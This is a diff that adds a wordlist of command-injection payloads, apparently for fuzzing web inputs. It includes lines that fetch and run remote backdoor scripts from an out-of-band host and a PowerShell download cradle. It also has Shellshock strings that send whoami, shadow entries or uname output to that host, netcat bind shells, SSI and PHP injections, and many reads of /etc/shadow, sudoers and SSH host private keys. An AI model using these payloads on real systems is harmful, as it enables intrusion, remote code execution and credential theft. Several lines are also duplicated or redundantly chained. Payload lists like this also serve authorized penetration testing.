@@ -1,0 +1,147 @@
+; id
+; whoami
+; cat /etc/passwd
+; cat /etc/shadow
+; ls -la
+; pwd
+; uname -a
+; ifconfig
+; netstat -an
+; ps aux
+; ping -c 4 127.0.0.1
+; curl -s "https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.sh" | sh
+; wget -q -O - "https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.sh" | sh
+; curl -s "https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.php" | php
+; wget -q -O - "https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.php" | php
+; powershell "IEX (New-Object Net.WebClient).DownloadString('https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/malicious.ps1')"
+; sudo -u www-data /bin/bash
+; %0a cat /etc/passwd
+; && cat /etc/passwd
+; $(cat /etc/passwd)
+; | cat /etc/passwd
+; `cat /etc/passwd`
+; $(/bin/cat /etc/passwd)
+; $(curl -s https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.sh)
+; $(wget -q -O - https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.sh)
+; $(curl -s https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.php)
+; $(wget -q -O - https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/backdoor.php)
+; cat /etc/hosts
+; $(cat /etc/passwd)
+; %0Acat%20/etc/passwd
+; {{ get_user_file("/etc/passwd") }}
+; <!--#exec cmd="/bin/cat /etc/passwd"-->
+; <!--#exec cmd="/bin/cat /etc/shadow"-->
+; <!--#exec cmd="/usr/bin/id;-->
+; system('cat /etc/passwd');
+; <?php system("cat /etc/passwd");?>
+; %0A/usr/bin/id
+; %0Aid
+; %0A/usr/bin/id%0A
+; %0Aid%0A
+; & ping -i 30 127.0.0.1 &
+; & ping -n 30 127.0.0.1 &
+; %0a ping -i 30 127.0.0.1 %0a
+; `ping 127.0.0.1`
+; | id
+; & id
+; ; id
+; %0a id %0a
+; `id`
+; $;/usr/bin/id
+; () { :;}; /bin/bash -c "curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=16?user='$(whoami)'"
+; () { :;}; /bin/bash -c "curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=18?pwd='$(pwd)'"
+; () { :;}; /bin/bash -c "curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=20?shadow='$(grep root /etc/shadow)'"
+; () { :;}; /bin/bash -c "curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=22?uname='$(uname -a)'"
+; () { :;}; /bin/bash -c "curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=24?shell='$(nc -lvvp 1234 -e /bin/bash)'"
+; () { :;}; /bin/bash -c "curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=26?shell='$(nc -lvvp 1236 -e /bin/bash &)'"
+; () { :;}; /bin/bash -c "curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=5'"
+; () { :;}; /bin/bash -c "sleep 1 && curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?sleep=1&?vuln=6'"
+; () { :;}; /bin/bash -c "sleep 1 && echo 'vulnerable 1'"
+; () { :;}; /bin/bash -c "sleep 3 && curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?sleep=3&?vuln=7'"
+; () { :;}; /bin/bash -c "sleep 3 && echo 'vulnerable 3'"
+; () { :;}; /bin/bash -c "sleep 6 && curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?sleep=6&?vuln=8'"
+; () { :;}; /bin/bash -c "sleep 6 && curl 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?sleep=9&?vuln=9'"
+; () { :;}; /bin/bash -c "sleep 6 && echo 'vulnerable 6'"
+; () { :;}; /bin/bash -c "wget 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=17?user='$(whoami)'"
+; () { :;}; /bin/bash -c "wget 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=19?pwd='$(pwd)'"
+; () { :;}; /bin/bash -c "wget 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=21?shadow='$(grep root /etc/shadow)'"
+; () { :;}; /bin/bash -c "wget 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=23?uname='$(uname -a)'"
+; () { :;}; /bin/bash -c "wget 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=25?shell='$(nc -lvvp 1235 -e /bin/bash)'"
+; () { :;}; /bin/bash -c "wget 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=27?shell='$(nc -lvvp 1237 -e /bin/bash &)'"
+; () { :;}; /bin/bash -c "wget 'https://cnp90s5sfgjs73cscmhgmrn98oeu8ujmo.oast.site/.testing/shellshock.txt?vuln=4'"
+; id
+; whoami
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/group
+; cat /etc/hosts
+; cat /etc/hostname
+; cat /etc/resolv.conf
+; cat /etc/network/interfaces
+; cat /etc/ssh/sshd_config
+; cat /etc/sudoers
+; cat /etc/pam.d/common-password
+; cat /etc/pam.d/common-auth
+; cat /etc/pam.d/system-auth
+; cat /etc/crontab
+; cat /etc/syslog.conf
+; cat /etc/syslog-ng/syslog-ng.conf
+; cat /etc/logrotate.conf
+; cat /etc/security/limits.conf
+; cat /etc/security/pam_env.conf
+; cat /etc/environment
+; cat /etc/issue
+; cat /etc/motd
+; cat /etc/profile
+; cat /etc/bash.bashrc
+; cat /etc/ssh/ssh_config
+; cat /etc/passwd | grep root
+; cat /etc/shadow | grep root
+; cat /etc/group | grep root
+; cat /etc/sudoers | grep root
+; cat /etc/pam.d/su | grep root
+; cat /etc/pam.d/login | grep root
+; cat /etc/cron.allow
+; cat /etc/cron.deny
+; cat /etc/at.allow
+; cat /etc/at.deny
+; cat /etc/securetty
+; cat /etc/hosts.allow
+; cat /etc/hosts.deny
+; cat /etc/xinetd.conf
+; cat /etc/exports
+; cat /etc/nfs.conf
+; cat /etc/auto.master
+; cat /etc/auto_home
+; cat /etc/auto_master
+; cat /etc/ssh/ssh_known_hosts
+; cat /etc/ssh/ssh_host_dsa_key
+; cat /etc/ssh/ssh_host_rsa_key
+; cat /etc/ssh/ssh_host_ecdsa_key
+; cat /etc/ssh/ssh_host_ed25519_key
+; cat /etc/ssh/ssh_host_dsa_key.pub
+; cat /etc/ssh/ssh_host_rsa_key.pub
+; cat /etc/ssh/ssh_host_ecdsa_key.pub
+; cat /etc/ssh/ssh_host_ed25519_key.pub
+; cat /etc/nsswitch.conf
+; cat /etc/hosts.equiv
+; cat /etc/mail.rc
+; cat /etc/sysctl.conf
+; cat /etc/shells
+; cat /etc/login.defs
+; cat /etc/rsyslog.conf
+; cat /etc/audit/auditd.conf
+; cat /etc/default/useradd
+; cat /etc/default/useradd
+; cat /etc/default/useradd
+; cat /etc/issue.net
+; cat /etc/aliases
+; cat /etc/hosts
+; cat /etc/hostname
+; cat /etc/passwd | grep -v "nologin" | grep -v "false"
+; cat /etc/passwd | grep -v "nologin" | grep -v "false" | grep -v "/sbin/nologin"
+; cat /etc/passwd | grep -v "nologin" | grep -v "false" | grep -v "/sbin/nologin" | grep -v "/bin/false"
+; cat /etc/passwd | grep -v "nologin" | grep -v "false" | grep -v "/sbin/nologin" | grep -v "/bin/false" | grep -v "/usr/sbin/nologin"
+; cat /etc/passwd | grep -v "nologin" | grep -v "false" | grep -v "/sbin/nologin" | grep -v "/bin/false" | grep -v "/usr/sbin/nologin" | grep -v "/usr/bin/false"
+; cat /etc/passwd | grep -v "nologin" | grep -v "false" | grep -v "/sbin/nologin" | grep -v "/bin/false" | grep -v "/usr/sbin/nologin" | grep -v "/usr/bin/false" | grep -v "/usr/sbin/nologin"
+; cat /etc/passwd | grep -v "nologin" | grep -v "false" | grep -v "/sbin/nologin" | grep -v "/bin/false" | grep -v "/usr/sbin/nologin" | grep -v "/usr/bin/false" | grep -v "/usr/sbin/nologin" | grep -v "/usr/bin/false"
